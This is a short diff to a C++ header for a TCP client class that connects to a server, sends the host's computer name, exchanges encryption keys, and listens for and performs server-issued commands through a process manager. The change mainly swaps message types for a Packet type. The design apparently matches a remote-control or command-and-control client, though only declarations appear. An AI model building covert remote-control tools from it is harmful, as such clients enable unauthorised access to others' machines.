@@ -52,11 +52,10 @@ public:
 
     bool               Connect();                   // Connect to the tcp server
     bool               Disconnect();  // Disconnect from the tcp server
-    BYTESTRING         MakeTCPRequest(const ClientRequest& req, BOOL encrypted = FALSE); // send a message, receive the response
-    bool               SendMessageToServer(Server& dest, ClientMessage message);
+    bool               SendMessageToServer(Server& dest, Packet message);
     bool               SendMessageToServer(std::string message, BOOL encrypted = TRUE); // Send a encrypted string to TCP server
     void               ListenForServerCommands();   // listen for commands from the server and perform them
-    BOOL               PerformCommand(const Packet& command, ClientResponse& outResponse); // Perform a command from the tcp server
+    BOOL               PerformCommand(const Packet& command, Packet& outResponse); // Perform a command from the tcp server
     const CMDDESC      CreateCommandDescription(const Packet& command);
 
 private:
@@ -66,7 +65,6 @@ private:
     bool               SendComputerNameToServer();  // send desktop computer name to tcp server. encrypted
     bool               IsServerAwaitingResponse(const Packet& commandPerformed);
     bool               ExchangeCryptoKeys();        // send client public key, receive server public key
-    Packet             OnEncryptedPacket(BYTESTRING encrypted); // on receive, decrypt and deserialize encrypted packet 
 
     ProcessManager     m_ProcMgr          = {};     // remote host process manager
     Server             m_TCPServerDetails = {};     // details describing the tcp server
